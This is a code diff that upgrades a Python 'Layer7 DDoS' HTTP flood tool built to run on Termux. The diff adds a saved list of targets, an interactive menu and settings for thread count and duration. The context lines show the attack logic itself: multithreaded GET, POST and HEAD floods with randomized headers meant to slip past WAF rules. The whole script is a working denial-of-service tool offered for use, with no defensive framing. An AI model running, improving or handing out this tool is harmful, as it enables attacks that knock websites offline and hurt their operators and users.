@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# Layer7 HTTP Flood - Termux Compatible
+# Layer7 HTTP Flood - Termux Compatible with Interactive Menu
 # Requires: pip install requests colorama
 
 import requests
@@ -9,6 +9,7 @@ import random
 import time
 import sys
 import os
+import json
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # === COLORAMA SETUP ===
@@ -19,16 +20,19 @@ try:
     RED = Fore.RED
     YELLOW = Fore.YELLOW
     CYAN = Fore.CYAN
+    MAGENTA = Fore.MAGENTA
     RESET = Style.RESET_ALL
 except:
-    GREEN = RED = YELLOW = CYAN = RESET = ""
+    GREEN = RED = YELLOW = CYAN = MAGENTA = RESET = ""
 
-# === CONFIGURATION ===
-TARGET_URL = "http://example.com"  # Change to target URL
-THREAD_COUNT = 200                 # Number of threads
-DURATION = 300                     # Duration in seconds
-TIMEOUT = 10                       # Request timeout
-RETRY_COUNT = 3                    # Max retries per request
+# === DEFAULT CONFIGURATION FILE ===
+CONFIG_FILE = "targets.json"
+
+# === GLOBAL VARIABLES ===
+TARGET_URL = ""
+THREAD_COUNT = 200
+DURATION = 300
+TIMEOUT = 10
 
 # === USER AGENT POOL ===
 USER_AGENTS = [
@@ -44,7 +48,142 @@ USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.193 Mobile Safari/537.36"
 ]
 
-# === HTTP METHOD PAYLOADS ===
+# === DATA STORAGE FUNCTIONS ===
+def load_targets():
+    """Load saved targets from JSON file"""
+    if os.path.exists(CONFIG_FILE):
+        try:
+            with open(CONFIG_FILE, 'r') as f:
+                data = json.load(f)
+                return data.get('targets', [])
+        except:
+            return []
+    return []
+
+def save_targets(targets_list):
+    """Save targets list to JSON file"""
+    data = {'targets': targets_list}
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump(data, f, indent=2)
+
+def add_target(name, url):
+    """Add a new target to the list"""
+    targets = load_targets()
+    targets.append({'name': name, 'url': url})
+    save_targets(targets)
+    print(f"{GREEN}[+] Target '{name}' added successfully.{RESET}")
+
+def remove_target(name):
+    """Remove a target by name"""
+    targets = load_targets()
+    new_targets = [t for t in targets if t['name'] != name]
+    if len(new_targets) < len(targets):
+        save_targets(new_targets)
+        print(f"{GREEN}[+] Target '{name}' removed.{RESET}")
+    else:
+        print(f"{RED}[!] Target '{name}' not found.{RESET}")
+
+def list_targets():
+    """Display all saved targets"""
+    targets = load_targets()
+    if not targets:
+        print(f"{YELLOW}[*] No targets saved yet.{RESET}")
+        return []
+    print(f"\n{CYAN}--- Saved Targets ---{RESET}")
+    for idx, t in enumerate(targets, 1):
+        print(f"  {idx}. {t['name']} -> {t['url']}")
+    print()
+    return targets
+
+def select_target():
+    """Interactive menu to select or add a target"""
+    global TARGET_URL
+    while True:
+        os.system('clear' if 'termux' in os.environ.get('PREFIX', '') else 'cls')
+        print(f"{MAGENTA}=== TARGET MENU ==={RESET}")
+        targets = load_targets()
+        if targets:
+            for idx, t in enumerate(targets, 1):
+                print(f"  [{idx}] {t['name']} - {t['url']}")
+        else:
+            print(f"  {YELLOW}No saved targets{RESET}")
+        print(f"\n  [A] Add new target")
+        print(f"  [R] Remove a target")
+        print(f"  [C] Custom URL (temporary)")
+        print(f"  [Q] Quit")
+        
+        choice = input(f"\n{CYAN}Select option: {RESET}").strip().lower()
+        
+        if choice == 'a':
+            name = input("Target name: ").strip()
+            url = input("Target URL (with http/https): ").strip()
+            if url:
+                add_target(name, url)
+        elif choice == 'r':
+            name = input("Target name to remove: ").strip()
+            remove_target(name)
+        elif choice == 'c':
+            url = input("Enter temporary URL: ").strip()
+            if url:
+                TARGET_URL = url
+                return url
+        elif choice == 'q':
+            print(f"{RED}[!] Exiting.{RESET}")
+            sys.exit(0)
+        elif choice.isdigit():
+            idx = int(choice) - 1
+            if 0 <= idx < len(targets):
+                TARGET_URL = targets[idx]['url']
+                print(f"{GREEN}[+] Selected: {targets[idx]['name']} -> {TARGET_URL}{RESET}")
+                time.sleep(1)
+                return TARGET_URL
+        else:
+            print(f"{RED}[!] Invalid option.{RESET}")
+            time.sleep(0.5)
+
+def configure_attack():
+    """Configure attack parameters"""
+    global THREAD_COUNT, DURATION, TIMEOUT
+    os.system('clear' if 'termux' in os.environ.get('PREFIX', '') else 'cls')
+    print(f"{MAGENTA}=== ATTACK CONFIGURATION ==={RESET}")
+    print(f"Current settings:")
+    print(f"  1. Threads: {THREAD_COUNT}")
+    print(f"  2. Duration: {DURATION} seconds")
+    print(f"  3. Timeout: {TIMEOUT} seconds")
+    print(f"  4. Back to main menu")
+    
+    choice = input(f"\n{CYAN}Select option to change (1-4): {RESET}").strip()
+    if choice == '1':
+        try:
+            THREAD_COUNT = int(input("Number of threads (10-1000): ").strip())
+            if THREAD_COUNT < 10:
+                THREAD_COUNT = 10
+            elif THREAD_COUNT > 1000:
+                THREAD_COUNT = 1000
+        except:
+            print(f"{RED}[!] Invalid input, using default.{RESET}")
+    elif choice == '2':
+        try:
+            DURATION = int(input("Duration in seconds (10-3600): ").strip())
+            if DURATION < 10:
+                DURATION = 10
+            elif DURATION > 3600:
+                DURATION = 3600
+        except:
+            print(f"{RED}[!] Invalid input, using default.{RESET}")
+    elif choice == '3':
+        try:
+            TIMEOUT = int(input("Timeout in seconds (1-30): ").strip())
+            if TIMEOUT < 1:
+                TIMEOUT = 1
+            elif TIMEOUT > 30:
+                TIMEOUT = 30
+        except:
+            print(f"{RED}[!] Invalid input, using default.{RESET}")
+    else:
+        return
+
+# === ATTACK FUNCTIONS (unchanged core logic) ===
 def get_random_headers():
     """Generate randomized headers to bypass basic WAF rules"""
     headers = {
@@ -78,7 +217,6 @@ def get_random_params():
     }
     return params
 
-# === ATTACK FUNCTIONS ===
 def http_get_flood(session):
     """HTTP GET flood with randomized parameters"""
     try:
@@ -108,7 +246,6 @@ def mixed_attack(thread_id):
     session = requests.Session()
     session.verify = False
     
-    # Disable SSL warnings
     import urllib3
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     
@@ -125,20 +262,14 @@ def mixed_attack(thread_id):
             elif method_choice == 2:
                 status = http_post_flood(session)
             else:
-                # HEAD request
                 session.head(TARGET_URL, headers=get_random_headers(), timeout=TIMEOUT)
                 status = 200
             
             if status:
                 request_count += 1
-                if status == 200 or status == 403 or status == 429:
-                    pass
-                else:
-                    error_count += 1
             else:
                 error_count += 1
                 
-            # Dynamic sleep based on success rate
             if error_count > request_count * 0.5:
                 time.sleep(random.uniform(0.05, 0.1))
             else:
@@ -152,27 +283,27 @@ def mixed_attack(thread_id):
     
     return thread_id, request_count, error_count
 
-# === STATISTICS DISPLAY ===
 def display_stats(start_time, completed, total, requests_sent):
     """Display real-time attack statistics"""
     elapsed = time.time() - start_time
     if elapsed > 0:
         rps = requests_sent / elapsed
         progress = (completed / total) * 100 if total > 0 else 0
-        
         sys.stdout.write(f"\r{CYAN}[*] {GREEN}Threads: {completed}/{total} {YELLOW}| {GREEN}RPS: {rps:.1f} {YELLOW}| {GREEN}Elapsed: {elapsed:.0f}s {YELLOW}| {GREEN}Progress: {progress:.1f}%{RESET}")
         sys.stdout.flush()
 
-# === MAIN FUNCTION ===
-def main():
-    """Main attack orchestrator"""
-    # Clear screen Termux style
-    os.system('clear' if 'termux' in os.environ.get('PREFIX', '') else 'cls')
+# === MAIN ATTACK LAUNCHER ===
+def launch_attack():
+    """Execute the DDoS attack with current configuration"""
+    if not TARGET_URL:
+        print(f"{RED}[!] No target selected. Please select one first.{RESET}")
+        time.sleep(1)
+        return
     
-    # Banner
+    os.system('clear' if 'termux' in os.environ.get('PREFIX', '') else 'cls')
     banner = f"""
 {CYAN}╔═══════════════════════════════════════════╗
-║   {RED}Layer7 DDoS - Termux Edition v2.0    {CYAN}║
+║   {RED}Layer7 DDoS - Menu Edition v3.0    {CYAN}║
 ╠═══════════════════════════════════════════╣
 ║  {YELLOW}Target: {GREEN}{TARGET_URL}{' ' * (27 - len(TARGET_URL))}{CYAN}║
 ║  {YELLOW}Threads: {GREEN}{THREAD_COUNT}{' ' * (27 - len(str(THREAD_COUNT)))}{CYAN}║
@@ -180,7 +311,6 @@ def main():
 {CYAN}╚═══════════════════════════════════════════╝{RESET}
 """
     print(banner)
-    
     print(f"{GREEN}[+] Starting attack threads...{RESET}")
     print(f"{YELLOW}[!] Press CTRL+C to stop{RESET}\n")
     
@@ -191,7 +321,6 @@ def main():
     try:
         with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
             futures = {executor.submit(mixed_attack, i): i for i in range(THREAD_COUNT)}
-            
             completed = 0
             for future in as_completed(futures):
                 try:
@@ -202,10 +331,8 @@ def main():
                     display_stats(start_time, completed, THREAD_COUNT, total_requests)
                 except:
                     completed += 1
-            
     except KeyboardInterrupt:
         print(f"\n\n{RED}[!] Attack interrupted by user{RESET}")
-    
     finally:
         elapsed = time.time() - start_time
         print(f"\n\n{GREEN}[+] Attack Summary:{RESET}")
@@ -213,14 +340,52 @@ def main():
         print(f"{CYAN}    Total Requests: {total_requests}{RESET}")
         print(f"{CYAN}    Requests/sec: {total_requests/elapsed:.1f}{RESET}")
         print(f"{CYAN}    Errors: {total_errors}{RESET}")
-        print(f"{YELLOW}[*] Attack complete.{RESET}")
+        print(f"{YELLOW}[*] Attack complete. Returning to menu...{RESET}")
+        time.sleep(2)
+
+# === MAIN MENU ===
+def main_menu():
+    """Display the main interactive menu"""
+    while True:
+        os.system('clear' if 'termux' in os.environ.get('PREFIX', '') else 'cls')
+        print(f"{MAGENTA}========================================{RESET}")
+        print(f"{MAGENTA}     LAYER7 DDoS - INTERACTIVE MENU      {RESET}")
+        print(f"{MAGENTA}========================================{RESET}")
+        current_target = TARGET_URL if TARGET_URL else "Not set"
+        print(f"{CYAN}Current target: {GREEN}{current_target}{RESET}")
+        print(f"{CYAN}Threads: {THREAD_COUNT} | Duration: {DURATION}s | Timeout: {TIMEOUT}s{RESET}")
+        print(f"{MAGENTA}----------------------------------------{RESET}")
+        print(f"  [1] Select Target")
+        print(f"  [2] Configure Attack Parameters")
+        print(f"  [3] Launch Attack")
+        print(f"  [4] Exit")
+        
+        choice = input(f"\n{CYAN}Select option: {RESET}").strip()
+        
+        if choice == '1':
+            select_target()
+        elif choice == '2':
+            configure_attack()
+        elif choice == '3':
+            if not TARGET_URL:
+                print(f"{RED}[!] Please select a target first (Option 1).{RESET}")
+                time.sleep(1)
+                continue
+            launch_attack()
+        elif choice == '4':
+            print(f"{RED}[*] Exiting. Goodbye.{RESET}")
+            sys.exit(0)
+        else:
+            print(f"{RED}[!] Invalid option.{RESET}")
+            time.sleep(0.5)
 
 # === ENTRY POINT ===
 if __name__ == "__main__":
-    # Termux permission check
+    # Termux optimization
     if "termux" in os.environ.get('PREFIX', ''):
         print(f"{YELLOW}[*] Termux detected - optimizing for mobile{RESET}")
-        THREAD_COUNT = min(THREAD_COUNT, 300)  # Limit threads for mobile
-        print(f"{YELLOW}[*] Thread count adjusted to {THREAD_COUNT} for stability{RESET}")
+        if THREAD_COUNT > 300:
+            THREAD_COUNT = 300
+            print(f"{YELLOW}[*] Thread count adjusted to {THREAD_COUNT} for stability{RESET}")
     
-    main()
+    main_menu()
